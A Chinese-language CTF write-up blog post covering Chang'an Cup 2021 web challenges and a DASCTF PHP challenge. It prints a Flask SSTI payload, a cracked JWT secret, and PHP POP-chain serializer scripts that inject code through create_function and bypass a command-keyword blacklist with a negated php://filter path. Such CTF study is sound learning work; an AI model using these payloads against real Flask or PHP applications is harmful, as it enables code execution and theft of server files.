---
title: 长安杯线上赛高校组
id: 长安杯线上赛高校组
date: 2021-09-25 19:33:30

---

<!-- more -->

## 长安杯web

--9.30起来做了个ezpy，完成了签到的基本目标，

还有2题工具一把梭hh，但感觉只能算做了一题吧。

没做的题目：

一个只知道要传json，不懂怎么利用，后面查资料可能是java的洞；
另一个是ThinkPHP

都没咋接触，要学的东西确实还很多

而且发现很多高校基本都是以web手为主，不过我们的pwn爷和密码哥也在成长了

希望明年国赛能带我进线下Q-Q

![](https://i.loli.net/2021/09/25/2iEPWjX4eaLN1M6.png)

### ezpy

jwt+ssti

token部分是jwt，https://jwt.io 解码，缺少密钥，用 [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) 爆破得 `CTf4r`

![](https://i.loli.net/2021/09/25/feScU6qkRQiONwv.png)

接下来jwt内容可控，结合题目ezpy，插件wapplalyzer看到是flask模版，尝试模版注入：

![](https://i.loli.net/2021/09/25/X2JTP6psyWtwQLu.png)

因为是用jwt形式传入，双引号不可用，故改用request方法调用模块

```python
{{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
```

![](https://i.loli.net/2021/09/25/m9h72JV4ATF8wEf.png)

![](https://i.loli.net/2021/09/25/HR2IkoX9DEaJ5Ul.png)

![](https://i.loli.net/2021/09/25/7sbv5ymO4IHUodD.png)



### Old But A Little New

没接触过，但不妨碍我一把梭：

[joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)](https://github.com/joaomatosf/jexboss)

![](https://i.loli.net/2021/09/25/UfcLM5nOvqCihmP.png)

https://github.com/joaomatosf/jexboss)

![2021925131523](https://i.loli.net/2021/09/25/NeqcG8OETxhbDoR.png)



### asuka

依然一把梭。

![](https://i.loli.net/2021/09/25/CB8EHkvzTtgAwIR.png)



## 补充DASCTF+浙江工业大学

因为长安杯是17.结束，知道这边也有比赛，没想到还可以报名，就进去看了下题：

### web

#### hellounser

后来找到原题：
[2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L'Amore (gem-love.com)](https://www.gem-love.com/ctf/770.html)

```php
<?php
class A {
    public $var;
    public function show(){
        echo $this->var;
    }
    public function __invoke(){
        $this->show();
    }
}

class B{
    public $func;
    public $arg;
    
    public function show(){
        $func = $this->func;
        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this->arg)) { 
            die('No!No!No!'); 
        } else { 
            include "flag.php";
            //There is no code to print flag in flag.php
            $func('', $this->arg); 
        }
    }
    
    public function __toString(){
        $this->show();
        return "<br>"."Nice Job!!"."<br>";
    }
    
    
}

if(isset($_GET['pop'])){
    $aaa = unserialize($_GET['pop']);
    $aaa();
}
else{
    highlight_file(__FILE__);
}

?>
```

简单的反序列化

1. _invoke：将类当作函数调用时触发
2. _tosting：将类当作字符串触发

第一步就是到达B类的show方法：

那么令A->$var为B类，然后反序列化a类；
则传入的序列化数据被赋给$aaa,$aaa()将a类当作函数调用，触发_invoke，输出$var，将b类当作字符串，触发tostring，成功到达b->show()

第二步就是绕过正则进行代码执行：

```php
if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this->arg)) { 
            die('No!No!No!'); 
        } else { 
            include "flag.php";
            //There is no code to print flag in flag.php
            $func('', $this->arg); 
        }
```

**绕过正则**

- func不能从头到尾只有数字和字母
  [PHP: 正则中可用的模式修饰符](https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php)：
  - i：大小写不敏感
  - s：点号元字符`.`匹配所有字符，包括换行符
  - D：美元符`$`仅匹配目标字符串的末尾，不加D则`$`会匹配换行符
- arg则是禁用了大量函数、关键字还有很多符号

func可以用creat_function()进行代码注入 [解析create_function()(seebug.org)](https://paper.seebug.org/94/)

> 创建匿名函数：
>
> ```php
> create_function('$name','echo $name."a"')
> ```
>
> 就类似于
>
> ```php
> function name($name) {
> 	echo $name."a";
> }
> ```
>
> 那么传入`a=;}phpinfo();/*`就会得到：
>
> ```php
> function name($name) {
> 	echo $name;}phpinfo();/*;
> }
> ```
>
> ;}将前面的语句和函数闭合，/*把后面的;}注释掉，phpinfo()；就成功执行了

这里也是一样：

1. func=creat_function
2. arg=;}a();/*

**然后就是看如何拿到flag**

1. 起初看到`include "flag.php"`，就想通过`$get_defind_vars()`输出所有变量从而获得$flag的值
   ```php
   <?php
   class A {
       public $var;
       public function __construct(){
           $this->var = new B();
       }
   }
   
   class B{
       public $func="create_function";
       public $arg=";}var_dump(get_defined_vars());//";
       }
   
   $a = new A();
   echo serialize($a);
   
   ?>
   ```

   但得到的是假的flag，提示真的flag在`Tru3flag.php`
   ![](https://i.loli.net/2021/09/26/JIVGtX2v5qHfOru.png)

2. 那么可以用文件包含+伪协议来读Tru3flag.php：

   ```php
   php://filter/convert.base64-encode/resource=Tru3flag.php
   ```

   伪协议中有关键字被过滤了，将其取反再urlencode编码再传入即可

   ```php
   <?php
   class A {
       public $var;
       public function __construct(){
           $this->var = new B();
       }
   }
   
   class B{
       public $func="create_function";
       public $arg;
       public function __construct(){
           $c=(~('php://filter/convert.base64-encode/resource=Tru3flag.php'));
           $this->arg = ';}require(~('.strval($c).'));//';
       }
   }
   
   $a = new A();
   echo urlencode(serialize($a));
   
   ?>
   ```

   将得到的base64值解码即得flag

![](https://i.loli.net/2021/09/26/H1KNUrnfqZgXWym.png)

